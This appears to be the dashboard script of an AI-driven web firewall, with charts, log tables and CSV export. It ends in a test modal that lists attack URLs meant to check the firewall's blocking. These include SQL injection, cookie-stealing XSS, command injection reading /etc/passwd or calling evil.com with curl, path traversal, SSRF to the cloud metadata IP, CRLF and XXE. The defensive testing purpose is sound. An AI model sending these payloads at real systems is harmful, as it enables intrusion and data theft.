/**
 * ============================================================
 * AI-NGFW SECURITY COMMAND CENTER - Dashboard Script
 * ============================================================
 *
 * Features:
 *   - Real-time AI threat data and risk metrics
 *   - Zero Trust monitoring visualisation
 *   - Light / Dark mode toggle
 *   - Login authentication
 *   - Interactive Chart.js visualisations
 *   - Auto-refresh every 5 seconds
 * ============================================================
 */

// ── API_BASE ─────────────────────────────────────────────────
// For local development: leave as '' (same-origin, port 4000).
// For production on Vercel: set to your Render firewall URL, e.g.:
//   const API_BASE = 'https://your-firewall.onrender.com';
const API_BASE = window.FIREWALL_API_BASE || '';

const REFRESH_INTERVAL = 5000;

let charts = {};

const elements = {
    totalRequests:     document.getElementById('totalRequests'),
    blockedRequests:   document.getElementById('blockedRequests'),
    intrusionAttempts: document.getElementById('intrusionAttempts'),
    blockedIPs:        document.getElementById('blockedIPs'),
    aiThreats:         document.getElementById('aiThreats'),
    avgRisk:           document.getElementById('avgRisk'),
    totalTrend:        document.getElementById('totalTrend'),
    blockedTrend:      document.getElementById('blockedTrend'),
    intrusionTrend:    document.getElementById('intrusionTrend'),
    ipsTrend:          document.getElementById('ipsTrend'),
    aiThreatsTrend:    document.getElementById('aiThreatsTrend'),
    avgRiskTrend:      document.getElementById('avgRiskTrend'),
    intrusionTable:    document.getElementById('intrusionTable'),
    aiThreatsTable:    document.getElementById('aiThreatsTable'),
    auditTable:        document.getElementById('auditTable'),
    blockedTable:      document.getElementById('blockedTable'),
    themeToggle:       document.getElementById('themeToggle'),
    logoutBtn:         document.getElementById('logoutBtn'),
    trafficLogCards:   document.getElementById('trafficLogCards')
};

// ════════════════════════════════════════════════════════════
// AUTH
// ════════════════════════════════════════════════════════════

function checkAuthentication() {
    if (!localStorage.getItem('loggedIn')) {
        window.location.href = 'login.html';
    }
}

elements.logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('loggedIn');
    localStorage.removeItem('userEmail');
    localStorage.removeItem('userName');
    window.location.href = 'login.html';
});

// ════════════════════════════════════════════════════════════
// THEME
// ════════════════════════════════════════════════════════════

function initTheme() {
    applyTheme(localStorage.getItem('theme') || 'dark');
}

function applyTheme(theme) {
    if (theme === 'light') {
        document.body.classList.add('light-mode');
        document.documentElement.setAttribute('data-theme', 'light');
    } else {
        document.body.classList.remove('light-mode');
        document.documentElement.setAttribute('data-theme', 'dark');
    }
    localStorage.setItem('theme', theme);
    if (Object.keys(charts).length > 0) setTimeout(initializeCharts, 100);
}

elements.themeToggle.addEventListener('click', () => {
    const cur = localStorage.getItem('theme') || 'dark';
    applyTheme(cur === 'dark' ? 'light' : 'dark');
});

// ════════════════════════════════════════════════════════════
// SIDEBAR PAGE NAVIGATION
// ════════════════════════════════════════════════════════════

document.querySelectorAll('.nav-item').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const page = link.getAttribute('data-page');
        if (!page) return;
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        const pageEl = document.getElementById('page-' + page);
        if (pageEl) pageEl.classList.add('active');
        link.classList.add('active');
    });
});

// ════════════════════════════════════════════════════════════
// CHARTS
// ════════════════════════════════════════════════════════════

function getChartTheme() {
    const isDark = !document.body.classList.contains('light-mode');
    return {
        isDark,
        textColor: isDark ? '#9ca3af' : '#475569',
        gridColor: isDark ? '#1f2937' : '#cbd5e1',
        bg:        isDark ? '#111827' : '#ffffff'
    };
}

function initializeCharts() {
    Object.values(charts).forEach(c => { if (c) c.destroy(); });
    charts = {};
    const t = getChartTheme();

    // Traffic doughnut
    const trafficCtx = document.getElementById('trafficChart')?.getContext('2d');
    if (trafficCtx) {
        charts.traffic = new Chart(trafficCtx, {
            type: 'doughnut',
            data: {
                labels: ['Allowed', 'Blocked'],
                datasets: [{ data: [70, 30], backgroundColor: ['#10b981', '#ef4444'], borderColor: [t.bg, t.bg], borderWidth: 2 }]
            },
            options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: t.textColor, font: { size: 12, weight: 600 } } } } }
        });
    }

    // Attack types (horizontal bar)
    const attackCtx = document.getElementById('attackChart')?.getContext('2d');
    if (attackCtx) {
        charts.attack = new Chart(attackCtx, {
            type: 'bar',
            data: {
                labels: ['SQL Injection', 'XSS', 'Cmd Injection'],
                datasets: [{ label: 'Detections', data: [0, 0, 0], backgroundColor: ['#ef4444', '#f59e0b', '#a855f7'], borderWidth: 0, borderRadius: 4 }]
            },
            options: {
                indexAxis: 'y', responsive: true, maintainAspectRatio: false,
                scales: { x: { ticks: { color: t.textColor }, grid: { color: t.gridColor } }, y: { ticks: { color: t.textColor }, grid: { color: t.gridColor } } },
                plugins: { legend: { display: false } }
            }
        });
    }

    // Risk timeline (line)
    const riskCtx = document.getElementById('riskTimelineChart')?.getContext('2d');
    if (riskCtx) {
        charts.riskTimeline = new Chart(riskCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Risk Score',
                    data: [],
                    borderColor: '#f59e0b',
                    backgroundColor: 'rgba(245,158,11,0.1)',
                    tension: 0.4, fill: true, borderWidth: 2, pointRadius: 3, pointBackgroundColor: '#f59e0b'
                }]
            },
            options: {
                responsive: true, maintainAspectRatio: false,
                scales: {
                    y: { min: 0, max: 1, ticks: { color: t.textColor, callback: v => v.toFixed(1) }, grid: { color: t.gridColor } },
                    x: { ticks: { color: t.textColor, maxTicksLimit: 10 }, grid: { color: t.gridColor } }
                },
                plugins: { legend: { labels: { color: t.textColor } } }
            }
        });
    }

    // Request trends (line)
    const trendsCtx = document.getElementById('trendsChart')?.getContext('2d');
    if (trendsCtx) {
        charts.trends = new Chart(trendsCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [
                    { label: 'Total Requests', data: [], borderColor: '#3b82f6', backgroundColor: 'rgba(59,130,246,0.1)', tension: 0.4, fill: true, borderWidth: 2 },
                    { label: 'Blocked',        data: [], borderColor: '#ef4444', backgroundColor: 'rgba(239,68,68,0.1)',  tension: 0.4, fill: true, borderWidth: 2 }
                ]
            },
            options: {
                responsive: true, maintainAspectRatio: false,
                interaction: { mode: 'index', intersect: false },
                scales: {
                    y: { beginAtZero: true, ticks: { color: t.textColor }, grid: { color: t.gridColor } },
                    x: { ticks: { color: t.textColor, maxTicksLimit: 10 }, grid: { color: t.gridColor } }
                },
                plugins: { legend: { labels: { color: t.textColor } } }
            }
        });
    }

    // Severity radar
    const sevCtx = document.getElementById('severityChart')?.getContext('2d');
    if (sevCtx) {
        charts.severity = new Chart(sevCtx, {
            type: 'radar',
            data: {
                labels: ['High', 'Medium', 'Low'],
                datasets: [{ label: 'Threat Level', data: [0, 0, 0], borderColor: '#f59e0b', backgroundColor: 'rgba(245,158,11,0.2)', borderWidth: 2 }]
            },
            options: {
                responsive: true, maintainAspectRatio: false,
                scales: { r: { ticks: { color: t.textColor, backdropColor: 'transparent' }, grid: { color: t.gridColor }, pointLabels: { color: t.textColor } } },
                plugins: { legend: { labels: { color: t.textColor } } }
            }
        });
    }

    // Top attackers (bar)
    const topCtx = document.getElementById('topAttackersChart')?.getContext('2d');
    if (topCtx) {
        charts.topAttackers = new Chart(topCtx, {
            type: 'bar',
            data: {
                labels: [],
                datasets: [{ label: 'Avg Risk', data: [], backgroundColor: '#ef4444', borderWidth: 0, borderRadius: 4 }]
            },
            options: {
                indexAxis: 'y', responsive: true, maintainAspectRatio: false,
                scales: {
                    x: { min: 0, max: 1, ticks: { color: t.textColor, callback: v => v.toFixed(1) }, grid: { color: t.gridColor } },
                    y: { ticks: { color: t.textColor }, grid: { color: t.gridColor } }
                },
                plugins: { legend: { display: false } }
            }
        });
    }
}

// ════════════════════════════════════════════════════════════
// DATA FETCHING
// ════════════════════════════════════════════════════════════

let previousStats = {};

async function fetchStats() {
    try {
        const res  = await fetch(`${API_BASE}/api/stats`);
        const json = await res.json();
        if (!json.success) return;
        const d = json.data;

        animateNumber(elements.totalRequests,     d.totalRequests);
        animateNumber(elements.blockedRequests,    d.blockedRequests);
        animateNumber(elements.intrusionAttempts,  d.intrusionAttempts);
        animateNumber(elements.blockedIPs,         d.blockedIPs);
        animateNumber(elements.aiThreats,          d.aiThreatsDetected || 0);
        if (elements.avgRisk) elements.avgRisk.textContent = (d.avgRiskScore || 0).toFixed(2);

        updateTrends(d, previousStats);
        previousStats = d;

        // Update traffic doughnut
        if (charts.traffic) {
            const allowed = d.totalRequests - d.blockedRequests;
            charts.traffic.data.datasets[0].data = [allowed, d.blockedRequests];
            charts.traffic.update();
        }
    } catch (err) { console.error('Stats fetch error:', err); }
}

function updateTrends(cur, prev) {
    const trend = (c, p) => {
        if (!p || p === 0) return c > 0 ? '\u2191' : '\u2192';
        const pct = Math.round(((c - p) / p) * 100);
        return pct > 0 ? `\u2191 ${pct}%` : pct < 0 ? `\u2193 ${Math.abs(pct)}%` : '\u2192 0%';
    };
    if (elements.totalTrend)     elements.totalTrend.textContent     = trend(cur.totalRequests,     prev.totalRequests);
    if (elements.blockedTrend)   elements.blockedTrend.textContent   = trend(cur.blockedRequests,    prev.blockedRequests);
    if (elements.intrusionTrend) elements.intrusionTrend.textContent = trend(cur.intrusionAttempts,  prev.intrusionAttempts);
    if (elements.ipsTrend)       elements.ipsTrend.textContent       = trend(cur.blockedIPs,         prev.blockedIPs);
    if (elements.aiThreatsTrend) elements.aiThreatsTrend.textContent = trend(cur.aiThreatsDetected,  prev.aiThreatsDetected);
}

function riskMeterClass(score) {
    const s = Number(score) || 0;
    if (s >= 0.7) return 'risk-high';
    if (s >= 0.4) return 'risk-mid';
    return 'risk-low';
}

async function fetchTrafficLogs() {
    const container = elements.trafficLogCards;
    if (!container) return;
    try {
        const res  = await fetch(`${API_BASE}/api/traffic-logs`);
        const json = await res.json();
        if (json.success && json.data.length > 0) {
            container.innerHTML = json.data.map(l => {
                const rawRisk = Number(l.risk_score) || 0;
                const risk = (l.action || '').toUpperCase() === 'ALLOW' && rawRisk === 0 ? 0.05 : rawRisk;
                const pct = Math.round(Math.min(1, Math.max(0, risk)) * 100);
                const riskClass = riskMeterClass(risk);
                const endpointEsc = escapeHtml(l.endpoint);
                const analysisEsc = l.ai_reason ? escapeHtml(l.ai_reason) : '—';
                const timeStr = formatTimestamp(l.timestamp);
                return `<div class="log-card" data-id="${l.id}">
                    <div class="log-card-main">
                        <div class="log-card-risk-col">
                            <span class="log-risk-value ${riskClass}">${risk.toFixed(2)}</span>
                            <div class="risk-meter"><div class="risk-meter-fill ${riskClass}" style="width:${pct}%"></div></div>
                        </div>
                        <div class="log-card-info">
                            <span class="log-card-endpoint" title="${endpointEsc}">${endpointEsc}</span>
                            <div class="log-card-meta">
                                <span class="log-card-ip">${escapeHtml(l.ip)}</span>
                                <span class="log-card-method method-${(l.method || 'GET').toLowerCase()}">${l.method || 'GET'}</span>
                                <span class="badge badge-${(l.action || 'ALLOW').toLowerCase()}">${l.action || 'ALLOW'}</span>
                            </div>
                        </div>
                        <span class="log-card-time">${timeStr}</span>
                        <svg class="log-card-expand-icon" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
                    </div>
                    <div class="log-card-detail">
                        <div class="log-detail-section">
                            <label>Risk score</label>
                            <div class="log-detail-meter-wrap">
                                <span class="log-risk-value ${riskClass}">${risk.toFixed(2)}</span>
                                <div class="log-detail-meter"><div class="log-detail-meter-fill ${riskClass}" style="width:${pct}%"></div></div>
                            </div>
                        </div>
                        <div class="log-detail-section">
                            <label>Endpoint</label>
                            <code class="log-detail-endpoint">${endpointEsc}</code>
                        </div>
                        <div class="log-detail-section">
                            <label>Analysis</label>
                            <p class="log-detail-analysis">${analysisEsc}</p>
                        </div>
                        <div class="log-detail-section">
                            <label>Details</label>
                            <p class="log-detail-analysis">IP: ${escapeHtml(l.ip)} | Method: ${l.method || 'GET'} | Action: ${l.action || 'ALLOW'} | ${timeStr}</p>
                        </div>
                    </div>
                </div>`;
            }).join('');

            container.querySelectorAll('.log-card').forEach(card => {
                card.addEventListener('click', () => card.classList.toggle('expanded'));
            });

            updateTrendsChart(json.data);
        } else if (json.success) {
            container.innerHTML = '<div class="empty-msg">No traffic logs recorded yet.</div>';
        }
    } catch (err) {
        console.error('Traffic logs error:', err);
        container.innerHTML = '<div class="empty-msg">Error loading traffic logs.</div>';
    }
}

async function fetchIntrusionLogs() {
    try {
        const res  = await fetch(`${API_BASE}/api/intrusion-logs`);
        const json = await res.json();
        if (json.success && json.data.length > 0) {
            elements.intrusionTable.innerHTML = json.data.map(l => `
                <tr>
                    <td>${l.id}</td>
                    <td>${escapeHtml(l.ip)}</td>
                    <td><span class="badge ${getAttackBadgeClass(l.attack_type)}">${escapeHtml(l.attack_type)}</span></td>
                    <td><code class="code-cell">${escapeHtml(l.endpoint)}</code></td>
                    <td><span class="badge badge-${l.severity.toLowerCase()}">${l.severity}</span></td>
                    <td>${formatTimestamp(l.timestamp)}</td>
                </tr>
            `).join('');

            // Update severity radar
            updateSeverityChart(json.data);
        } else if (json.success) {
            elements.intrusionTable.innerHTML = '<tr><td colspan="6" class="empty-msg">No intrusions detected.</td></tr>';
        }
    } catch (err) {
        console.error('Intrusion logs error:', err);
        elements.intrusionTable.innerHTML = '<tr><td colspan="6" class="empty-msg">Error loading intrusion logs.</td></tr>';
    }
}

async function fetchAIThreatLogs() {
    try {
        const res  = await fetch(`${API_BASE}/api/ai-threat-logs`);
        const json = await res.json();
        if (json.success && json.data.length > 0) {
            elements.aiThreatsTable.innerHTML = json.data.map(l => `
                <tr>
                    <td>${l.id}</td>
                    <td>${escapeHtml(l.ip)}</td>
                    <td><code class="code-cell">${escapeHtml(l.endpoint)}</code></td>
                    <td><span class="badge badge-${l.action.toLowerCase()}">${l.action}</span></td>
                    <td><span class="badge ${getAttackBadgeClass(l.attack_type)}">${escapeHtml(l.attack_type || '—')}</span></td>
                    <td><span class="badge badge-${(l.severity||'low').toLowerCase()}">${(l.severity||'—').toUpperCase()}</span></td>
                    <td>${riskScoreBadge(l.risk_score)}</td>
                    <td class="ai-reason-cell">${escapeHtml(l.ai_reason || '—')}</td>
                    <td>${formatTimestamp(l.timestamp)}</td>
                </tr>
            `).join('');
        } else if (json.success) {
            elements.aiThreatsTable.innerHTML = '<tr><td colspan="9" class="empty-msg">No threats detected yet.</td></tr>';
        }
    } catch (err) {
        console.error('AI threat logs error:', err);
        elements.aiThreatsTable.innerHTML = '<tr><td colspan="9" class="empty-msg">Error loading threat logs.</td></tr>';
    }
}

async function fetchAuditLogs() {
    try {
        const res  = await fetch(`${API_BASE}/api/audit-logs`);
        const json = await res.json();
        if (json.success && json.data.length > 0) {
            elements.auditTable.innerHTML = json.data.map(l => `
                <tr>
                    <td>${l.id}</td>
                    <td>${escapeHtml(l.action)}</td>
                    <td>${formatTimestamp(l.timestamp)}</td>
                </tr>
            `).join('');
        } else if (json.success) {
            elements.auditTable.innerHTML = '<tr><td colspan="3" class="empty-msg">No audit logs available.</td></tr>';
        }
    } catch (err) {
        console.error('Audit logs error:', err);
        elements.auditTable.innerHTML = '<tr><td colspan="3" class="empty-msg">Error loading audit logs.</td></tr>';
    }
}

async function fetchBlockedIPs() {
    try {
        const res  = await fetch(`${API_BASE}/api/blocked-ips`);
        const json = await res.json();
        if (json.success && json.data.length > 0) {
            elements.blockedTable.innerHTML = json.data.map(e => `
                <tr>
                    <td>${e.id}</td>
                    <td>${escapeHtml(e.ip)}</td>
                    <td>${escapeHtml(e.reason)}</td>
                    <td>${formatTimestamp(e.timestamp)}</td>
                    <td><button class="btn-unblock" data-id="${e.id}" data-ip="${escapeHtml(e.ip)}" onclick="unblockIP(this)">UNBLOCK</button></td>
                </tr>
            `).join('');
        } else if (json.success) {
            elements.blockedTable.innerHTML = '<tr><td colspan="5" class="empty-msg">No blocked IPs.</td></tr>';
        }
    } catch (err) {
        console.error('Blocked IPs error:', err);
        elements.blockedTable.innerHTML = '<tr><td colspan="5" class="empty-msg">Error loading blocked IPs.</td></tr>';
    }
}

async function fetchRiskMetrics() {
    try {
        const res  = await fetch(`${API_BASE}/api/risk-metrics`);
        const json = await res.json();
        if (!json.success) return;
        const d = json.data;

        // Update risk timeline chart
        if (charts.riskTimeline && d.riskTimeline && d.riskTimeline.length > 0) {
            const reversed = [...d.riskTimeline].reverse();
            charts.riskTimeline.data.labels            = reversed.map(r => formatShortTime(r.timestamp));
            charts.riskTimeline.data.datasets[0].data  = reversed.map(r => r.risk_score);
            charts.riskTimeline.update();
        }

        // Update attack type distribution chart
        if (charts.attack && d.attackTypeDistribution && d.attackTypeDistribution.length > 0) {
            const labels = d.attackTypeDistribution.map(a => formatAttackLabel(a.attack_type));
            const data   = d.attackTypeDistribution.map(a => a.count);
            const colors = d.attackTypeDistribution.map(a => attackColor(a.attack_type));
            charts.attack.data.labels              = labels;
            charts.attack.data.datasets[0].data    = data;
            charts.attack.data.datasets[0].backgroundColor = colors;
            charts.attack.update();
        }
    } catch (err) { console.error('Risk metrics error:', err); }
}

async function fetchTopAttackers() {
    try {
        const res  = await fetch(`${API_BASE}/api/top-attackers`);
        const json = await res.json();
        if (!json.success) return;
        if (charts.topAttackers && json.data.length > 0) {
            charts.topAttackers.data.labels            = json.data.map(a => a.ip);
            charts.topAttackers.data.datasets[0].data  = json.data.map(a => a.avg_risk);
            charts.topAttackers.update();
        }
    } catch (err) { console.error('Top attackers error:', err); }
}

// ════════════════════════════════════════════════════════════
// CHART UPDATERS
// ════════════════════════════════════════════════════════════

function updateTrendsChart(logs) {
    if (!charts.trends || logs.length === 0) return;
    const buckets = {};
    logs.slice(0, 100).forEach(l => {
        const key = formatShortTime(l.timestamp);
        if (!buckets[key]) buckets[key] = { total: 0, blocked: 0 };
        buckets[key].total++;
        if (l.action === 'BLOCK') buckets[key].blocked++;
    });
    const keys = Object.keys(buckets).reverse().slice(-15);
    charts.trends.data.labels            = keys;
    charts.trends.data.datasets[0].data  = keys.map(k => buckets[k].total);
    charts.trends.data.datasets[1].data  = keys.map(k => buckets[k].blocked);
    charts.trends.update();
}

function updateSeverityChart(logs) {
    if (!charts.severity) return;
    let high = 0, med = 0, low = 0;
    logs.forEach(l => {
        const s = (l.severity || '').toUpperCase();
        if (s === 'HIGH')        high++;
        else if (s === 'MEDIUM') med++;
        else                     low++;
    });
    charts.severity.data.datasets[0].data = [high, med, low];
    charts.severity.update();
}

// ════════════════════════════════════════════════════════════
// UNBLOCK
// ════════════════════════════════════════════════════════════

async function unblockIP(button) {
    const id = button.getAttribute('data-id');
    const ip = button.getAttribute('data-ip');
    if (!confirm(`Unblock IP: ${ip}?`)) return;
    try {
        button.disabled = true;
        button.textContent = 'Unblocking...';
        const res  = await fetch(`${API_BASE}/api/blocked-ips/${id}`, { method: 'DELETE' });
        const json = await res.json();
        if (json.success) {
            await fetchBlockedIPs();
            await fetchStats();
        } else {
            alert('Error: ' + (json.error || 'Unknown'));
            button.disabled = false;
            button.textContent = 'UNBLOCK';
        }
    } catch (err) {
        alert('Error: ' + err.message);
        button.disabled = false;
        button.textContent = 'UNBLOCK';
    }
}

// ════════════════════════════════════════════════════════════
// DOWNLOAD CSV
// ════════════════════════════════════════════════════════════

function escapeCsvField(val) {
    if (val == null) return '';
    const s = String(val);
    if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
    return s;
}

function arrayToCsv(rows, columns) {
    const header = columns.map(c => c.header).join(',');
    const body = rows.map(row => columns.map(c => escapeCsvField(row[c.key])).join(','));
    return [header, ...body].join('\r\n');
}

function downloadCsv(csv, filename) {
    const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}

async function downloadTrafficCsv() {
    try {
        const res = await fetch(`${API_BASE}/api/traffic-logs`);
        const json = await res.json();
        if (!json.success || !json.data.length) { alert('No traffic logs to export.'); return; }
        const cols = [
            { key: 'id', header: 'ID' }, { key: 'ip', header: 'IP' }, { key: 'endpoint', header: 'Endpoint' },
            { key: 'method', header: 'Method' }, { key: 'action', header: 'Action' }, { key: 'risk_score', header: 'Risk Score' },
            { key: 'attack_type', header: 'Attack Type' }, { key: 'severity', header: 'Severity' },
            { key: 'ai_reason', header: 'Analysis' }, { key: 'timestamp', header: 'Time' }
        ];
        downloadCsv(arrayToCsv(json.data, cols), `traffic-logs-${new Date().toISOString().slice(0,10)}.csv`);
    } catch (e) { alert('Export failed: ' + e.message); }
}

async function downloadIntrusionCsv() {
    try {
        const res = await fetch(`${API_BASE}/api/intrusion-logs`);
        const json = await res.json();
        if (!json.success || !json.data.length) { alert('No intrusion logs to export.'); return; }
        const cols = [
            { key: 'id', header: 'ID' }, { key: 'ip', header: 'IP' }, { key: 'attack_type', header: 'Attack Type' },
            { key: 'endpoint', header: 'Endpoint' }, { key: 'severity', header: 'Severity' }, { key: 'timestamp', header: 'Time' }
        ];
        downloadCsv(arrayToCsv(json.data, cols), `intrusion-logs-${new Date().toISOString().slice(0,10)}.csv`);
    } catch (e) { alert('Export failed: ' + e.message); }
}

async function downloadThreatsCsv() {
    try {
        const res = await fetch(`${API_BASE}/api/ai-threat-logs`);
        const json = await res.json();
        if (!json.success || !json.data.length) { alert('No threat logs to export.'); return; }
        const cols = [
            { key: 'id', header: 'ID' }, { key: 'ip', header: 'IP' }, { key: 'endpoint', header: 'Endpoint' },
            { key: 'action', header: 'Action' }, { key: 'attack_type', header: 'Attack Type' }, { key: 'severity', header: 'Severity' },
            { key: 'risk_score', header: 'Risk Score' }, { key: 'ai_reason', header: 'Reason' }, { key: 'timestamp', header: 'Time' }
        ];
        downloadCsv(arrayToCsv(json.data, cols), `threats-${new Date().toISOString().slice(0,10)}.csv`);
    } catch (e) { alert('Export failed: ' + e.message); }
}

async function downloadAuditCsv() {
    try {
        const res = await fetch(`${API_BASE}/api/audit-logs`);
        const json = await res.json();
        if (!json.success || !json.data.length) { alert('No audit logs to export.'); return; }
        const cols = [
            { key: 'id', header: 'ID' }, { key: 'action', header: 'Action' }, { key: 'timestamp', header: 'Time' }
        ];
        downloadCsv(arrayToCsv(json.data, cols), `audit-logs-${new Date().toISOString().slice(0,10)}.csv`);
    } catch (e) { alert('Export failed: ' + e.message); }
}

// ════════════════════════════════════════════════════════════
// MASTER REFRESH
// ════════════════════════════════════════════════════════════

async function refreshDashboard() {
    await Promise.all([
        fetchStats(),
        fetchTrafficLogs(),
        fetchIntrusionLogs(),
        fetchAIThreatLogs(),
        fetchAuditLogs(),
        fetchBlockedIPs(),
        fetchRiskMetrics(),
        fetchTopAttackers()
    ]);
}

// ════════════════════════════════════════════════════════════
// UTILITIES
// ════════════════════════════════════════════════════════════

function escapeHtml(str) {
    if (!str) return '';
    const d = document.createElement('div');
    d.appendChild(document.createTextNode(str));
    return d.innerHTML;
}

function formatTimestamp(ts) {
    if (!ts) return 'N/A';
    try {
        const d = new Date(ts);
        if (isNaN(d.getTime())) return ts;
        return d.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
    } catch { return ts; }
}

function formatShortTime(ts) {
    if (!ts) return '';
    try {
        const d = new Date(ts);
        if (isNaN(d.getTime())) return ts;
        return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
    } catch { return ts; }
}

function getAttackBadgeClass(type) {
    if (!type) return '';
    const t = type.toUpperCase();
    if (t.includes('SQL'))     return 'badge-sql';
    if (t.includes('XSS'))     return 'badge-xss';
    if (t.includes('COMMAND')) return 'badge-cmd';
    if (t.includes('RECON'))   return 'badge-recon';
    return '';
}

function riskScoreBadge(score) {
    const s = parseFloat(score) || 0;
    if (s === 0) return '<span style="opacity:0.3">0.00</span>';
    let cls = 'risk-low';
    if (s >= 0.75)      cls = 'risk-critical';
    else if (s >= 0.5)  cls = 'risk-high';
    else if (s >= 0.3)  cls = 'risk-medium';
    return `<span class="risk-badge ${cls}">${s.toFixed(2)}</span>`;
}

function formatAttackLabel(type) {
    if (!type) return 'Unknown';
    return type.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
}

function attackColor(type) {
    if (!type) return '#6b7280';
    const t = type.toUpperCase();
    if (t.includes('SQL'))     return '#ef4444';
    if (t.includes('XSS'))     return '#f59e0b';
    if (t.includes('COMMAND')) return '#a855f7';
    if (t.includes('RECON'))   return '#3b82f6';
    return '#6b7280';
}

function animateNumber(el, target) {
    if (!el) return;
    const current = parseInt(el.textContent) || 0;
    if (current === target) return;
    const steps = 20;
    const inc   = (target - current) / steps;
    let step = 0;
    const timer = setInterval(() => {
        step++;
        if (step >= steps) { el.textContent = target; clearInterval(timer); }
        else { el.textContent = Math.round(current + inc * step); }
    }, 25);
}

// ════════════════════════════════════════════════════════════
// INIT
// ════════════════════════════════════════════════════════════

// ════════════════════════════════════════════════════════════
// TEST MODAL
// ════════════════════════════════════════════════════════════

const TEST_COMMANDS_LOW = [
    { label: 'Normal GET /proxy/', url: '/proxy/' },
    { label: 'Normal GET /proxy/api/data', url: '/proxy/api/data' },
    { label: 'Login page', url: '/login' },
    { label: 'Login with user param (safe)', url: '/login?user=john' },
    { label: 'Proxy with query', url: '/proxy/?page=1&limit=10' }
];

const TEST_SQL = [
    { label: 'OR 1=1', url: '/login?user=%27+OR+1%3d1--' },
    { label: 'UNION SELECT', url: '/login?user=%27+UNION+SELECT+*+FROM+users--' },
    { label: 'DROP TABLE', url: '/login?user=1%3b+DROP+TABLE+users--' },
    { label: "OR '1'='1", url: '/login?user=%27+OR+%271%27%3d%271%27--' },
    { label: 'Admin comment', url: '/login?user=admin%27--' },
    { label: 'Boolean blind', url: '/login?user=%27+AND+1%3d1--' },
    { label: 'Stacked query', url: '/login?user=1%3b+SELECT+*+FROM+users--' }
];

const TEST_XSS = [
    { label: '<script>alert(1)</script>', url: '/login?user=%3cscript%3ealert(1)%3c/script%3e' },
    { label: 'javascript: scheme', url: '/login?user=javascript%3aalert(document.cookie)' },
    { label: '<img onerror>', url: '/login?user=%3cimg+src%3dx+onerror%3dalert(1)%3e' },
    { label: '<svg onload>', url: '/login?user=%3csvg/onload%3dalert(1)%3e' },
    { label: '<body onload>', url: '/login?user=%3cbody+onload%3dalert(1)%3e' },
    { label: '"> with script', url: '/login?user=%22%3e%3cscript%3ealert(1)%3c/script%3e' },
    { label: '<iframe javascript>', url: '/login?user=%3ciframe+src%3d%22javascript%3aalert(1)%22%3e' },
    { label: 'Event handler', url: '/login?user=%3cinput+onfocus%3dalert(1)+autofocus%3e' }
];

const TEST_CMD = [
    { label: '| whoami', url: '/api/data?cmd=%7c+whoami' },
    { label: '; ls -la', url: '/api/data?cmd=%3b+ls+-la' },
    { label: '&& cat /etc/passwd', url: '/api/data?cmd=%26%26+cat+%2fetc%2fpasswd' },
    { label: 'Backticks id', url: '/api/data?cmd=%60id%60' },
    { label: '$(whoami)', url: '/api/data?cmd=%24(whoami)' },
    { label: 'Newline cat', url: '/api/data?cmd=%0a%2fbin%2fcat+%2fetc%2fpasswd' },
    { label: 'Semicolon cat', url: '/api/data?cmd=%3bcat%20%2fetc%2fpasswd' },
    { label: 'Pipe curl', url: '/api/data?cmd=%7c+curl+evil.com' }
];

const TEST_PATH = [
    { label: '../etc/passwd', url: '/proxy/..%2f..%2f..%2fetc%2fpasswd' },
    { label: 'file param LFI', url: '/api/data?file=../../../etc/passwd' },
    { label: '....// strip bypass', url: '/proxy/....//....//etc/passwd' },
    { label: 'path param', url: '/api/data?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd' }
];

const TEST_OTHER = [
    { label: 'LDAP injection *)(uid=*', url: '/login?user=*)(uid%3d*' },
    { label: 'NoSQL $ne', url: '/login?user%5b%24ne%5d=1' },
    { label: 'SSRF metadata IP', url: '/api/data?url=http%3a%2f%2f169.254.169.254' },
    { label: 'Open redirect', url: '/login?redirect=http%3a%2f%2fevil.com' },
    { label: 'CRLF injection', url: '/login?user=test%0d%0aSet-Cookie%3a+evil%3d1' },
    { label: 'XML entity', url: '/api/data?q=%3c%21ENTITY+xx+SYSTEM+%22file%3a%2f%2f%2fetc%2fpasswd%22%3e' }
];

function renderTestList(containerId, list) {
    const el = document.getElementById(containerId);
    if (!el) return;
    el.innerHTML = list.map((t, i) => `
        <div class="test-row" data-url="${escapeHtml(t.url)}">
            <span class="test-label">${escapeHtml(t.label)}</span>
            <span class="test-url" title="${escapeHtml(t.url)}">${escapeHtml(t.url)}</span>
            <span class="test-result" data-result></span>
            <button type="button" class="btn-run" data-url="${escapeHtml(t.url)}">Run</button>
        </div>
    `).join('');
}

async function runTest(url, resultEl, btn) {
    if (!resultEl || !btn) return;
    btn.disabled = true;
    resultEl.textContent = '…';
    resultEl.className = 'test-result';
    try {
        const res = await fetch(url, { method: 'GET', credentials: 'same-origin' });
        resultEl.textContent = res.status.toString();
        resultEl.className = 'test-result ' + (res.status === 200 ? 'ok' : res.status === 403 ? 'blocked' : 'err');
        if (typeof refreshDashboard === 'function') setTimeout(refreshDashboard, 600);
    } catch (err) {
        resultEl.textContent = 'Err';
        resultEl.className = 'test-result err';
    }
    btn.disabled = false;
}

function initTestModal() {
    const modal = document.getElementById('testModal');
    const openBtn = document.getElementById('testModalBtn');
    const closeBtn = document.getElementById('testModalClose');
    if (!modal || !openBtn) return;

    renderTestList('testListLow', TEST_COMMANDS_LOW);
    renderTestList('testListSql', TEST_SQL);
    renderTestList('testListXss', TEST_XSS);
    renderTestList('testListCmd', TEST_CMD);
    renderTestList('testListPath', TEST_PATH);
    renderTestList('testListOther', TEST_OTHER);

    openBtn.addEventListener('click', () => {
        modal.classList.add('open');
